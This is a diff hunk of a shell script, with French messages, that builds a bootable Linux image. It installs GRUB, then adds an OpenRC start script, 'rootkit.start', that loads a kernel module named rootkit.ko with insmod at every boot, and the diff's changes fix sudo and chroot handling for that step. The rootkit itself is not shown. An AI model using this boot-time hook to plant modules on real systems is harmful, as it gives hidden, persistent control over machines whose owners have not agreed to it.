@@ -129,13 +129,16 @@ EOF
 grub-install --directory="$GRUB_DIR" --boot-directory="$ROOTFS_DIR/boot" "$LOOP_DEVICE"
 
 echo "Ajout d'un script de démarrage pour le rootkit..."
-cat <<'EOF' > "$ROOTFS_DIR/etc/local.d/rootkit.start"
+sudo mkdir -p "$ROOTFS_DIR/etc/local.d"
+cat <<'EOF' | sudo tee "$ROOTFS_DIR/etc/local.d/rootkit.start" > /dev/null
 #!/bin/sh
 insmod /home/user/rootkit.ko
 EOF
-chmod +x "$ROOTFS_DIR/etc/local.d/rootkit.start"
+sudo chmod +x "$ROOTFS_DIR/etc/local.d/rootkit.start"
 
-chroot "$ROOTFS_DIR" rc-update add local default
+echo "Activation du service 'local' au démarrage..."
+sudo chroot "$ROOTFS_DIR" /bin/sh -c "rc-update add local default"
+
 
 ########################################
 #          Nettoyage                   #
